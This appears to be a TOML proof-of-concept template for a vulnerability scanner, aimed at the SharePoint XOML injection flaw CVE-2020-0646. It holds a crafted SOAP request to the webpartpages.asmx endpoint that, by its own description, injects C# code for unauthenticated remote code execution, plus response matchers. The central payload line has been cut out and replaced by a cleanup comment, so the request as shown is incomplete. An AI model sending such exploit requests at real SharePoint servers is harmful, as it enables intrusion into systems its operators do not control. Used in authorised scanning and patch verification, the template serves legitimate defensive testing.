[info]
author = "ave"
description = "通过向 SharePoint _vti_bin/webpartpages.asmx SOAP 接口发送特制 XOML 载荷，利用 CallExternalMethodActivity 的 InterfaceType 属性注入恶意 C# 代码，绕过 Workflow 编译器的 nocode 限制实现远程代码执行。无需认证即可触发，影响严重。"
id = "POC-AVE-2020-0008"
name = "Microsoft SharePoint .NET Framework XOML Injection RCE PoC"
severity = "critical"
tags = ["ave-2020-0008"]
vuln_id = [
    "CVE-2020-0646",
    "AVE-2020-0008",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/_vti_bin/webpartpages.asmx"
protocol = "http"

[poc.requests.body]
content = """
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<ValidateWorkflowMarkupAndCreateSupportObjects xmlns="http://microsoft.com/sharepoint/webpartpages">
<workflowMarkupText><![CDATA[
<SequentialWorkflowActivity x:Class="MyWorkflow" x:Name="foobar" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow">
# [cleanup] skipped line with string multiplication: <CallExternalMethodActivity x:Name="foo" MethodName='test1' 
</SequentialWorkflowActivity>
]]></workflowMarkupText>
<rulesText></rulesText>
<configBlob></configBlob>
<flag>2</flag>
</ValidateWorkflowMarkupAndCreateSupportObjects>
</soap:Body>
</soap:Envelope>"""
type = "raw"

[poc.requests.headers]
Content-Type = "text/xml; charset=utf-8"
SOAPAction = "http://microsoft.com/sharepoint/webpartpages/ValidateWorkflowMarkupAndCreateSupportObjects"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["ValidateWorkflowMarkupAndCreateSupportObjectsResponse"]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
